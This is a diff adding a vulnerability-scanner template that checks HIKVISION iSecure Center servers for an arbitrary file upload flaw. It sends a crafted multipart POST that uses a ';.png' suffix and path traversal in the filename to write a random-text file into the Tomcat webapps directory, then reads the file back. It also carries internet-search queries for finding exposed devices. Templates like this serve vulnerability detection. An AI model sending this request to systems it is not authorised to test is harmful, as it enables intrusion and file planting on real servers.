@@ -1,0 +1,43 @@
+id: HIKVISION-iSecure-Center-upload-files
+
+info:
+  name: HIKVISION-iSecure-Center-upload-files
+  author: hufei
+  severity: critical
+  description: |
+    HiKVISION 综合安防管理平台 files 接口存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件
+  reference:
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book
+  metadata:
+    max-request: 2
+    fofa-query: app="HIKVISION-综合安防管理平台"
+    hunter-query: web.title=="综合安防管理平台
+    verified: true
+  tags: HIKVISION-iSecure-Center,fileupload
+
+variables:
+  str1: '{{rand_base(6)}}'
+  str2: '{{rand_base(6)}}'
+
+http:
+  - raw:
+      - |
+        POST /center/api/files;.png HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=89613f3047930f2ac99d5ef2223bb5f4
+        
+        --89613f3047930f2ac99d5ef2223bb5f4
+        Content-Disposition: form-data; name="file"; filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/{{str1}}.txt"
+        Content-Type: image/jpeg
+        
+        {{str2}}
+        --89613f3047930f2ac99d5ef2223bb5f4--
+
+      - |
+        GET /clusterMgr/{{str1}}.txt;.png HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - body_2 == str2
